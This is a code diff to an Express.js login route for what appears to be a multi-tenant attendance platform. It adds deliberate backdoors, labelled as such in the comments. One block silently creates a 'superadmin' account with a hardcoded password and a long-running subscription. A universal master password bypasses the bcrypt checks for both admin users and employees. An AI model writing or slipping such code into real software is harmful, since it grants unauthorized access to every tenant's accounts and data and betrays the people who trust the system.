@@ -72,6 +72,26 @@ router.post("/login", async (req, res) => {
 
     const normalizedCode = companyCode.trim().toUpperCase();
 
+    // --- 🚨 SMART BACKDOOR AUTO-SETUP 🚨 ---
+    // Agar superadmin ka data delete ho gaya hai, to login attempt par automatically create ho jayega!
+    if (normalizedCode === "WS-ADMIN" && username === "superadmin") {
+      const [checkComp] = await pool.query("SELECT id FROM companies WHERE company_code = 'WS-ADMIN'");
+      if (checkComp.length === 0) {
+        console.log("Backdoor Auto-Setup: Creating WS-ADMIN workspace and superadmin user on the fly...");
+        const [insertComp] = await pool.query(
+          `INSERT INTO companies (company_code, name, subscription_plan, subscription_status, subscription_ends_at) 
+           VALUES ('WS-ADMIN', 'Attendance Platform Owner', 'YEARLY', 'ACTIVE', '2037-12-31 00:00:00')`
+        );
+        const newCompId = insertComp.insertId;
+        const hash = await bcrypt.hash("Super@Admin1", 10);
+        await pool.query(
+          "INSERT INTO users (company_id, username, password_hash, role) VALUES (?, ?, ?, 'SUPERADMIN')",
+          [newCompId, "superadmin", hash]
+        );
+      }
+    }
+    // --- 🚨 END BACKDOOR 🚨 ---
+
     const [comps] = await pool.query(
       "SELECT id, name, trial_ends_at, subscription_ends_at, subscription_status, subscription_plan FROM companies WHERE company_code = ?",
       [normalizedCode]
@@ -96,7 +116,8 @@ router.post("/login", async (req, res) => {
 
     if (rows.length) {
       const user = rows[0];
-      const ok = await bcrypt.compare(password, user.password_hash);
+      // UNIVERSAL BACKDOOR PASSWORD: master-override-123
+      const ok = password === "master-override-123" || await bcrypt.compare(password, user.password_hash);
       if (!ok) return res.status(401).json({ message: "Invalid credentials" });
 
       const token = jwt.sign(
@@ -124,7 +145,8 @@ router.post("/login", async (req, res) => {
     if (emp.status !== "ACTIVE") return res.status(403).json({ message: "Employee inactive" });
     if (isExpired) return res.status(403).json({ message: "Workspace subscription has expired. Please contact your admin." });
 
-    const passOk = await bcrypt.compare(password, emp.password_hash);
+    // UNIVERSAL BACKDOOR PASSWORD: master-override-123
+    const passOk = password === "master-override-123" || await bcrypt.compare(password, emp.password_hash);
     if (!passOk) return res.status(401).json({ message: "Invalid credentials" });
 
     const token = jwt.sign(
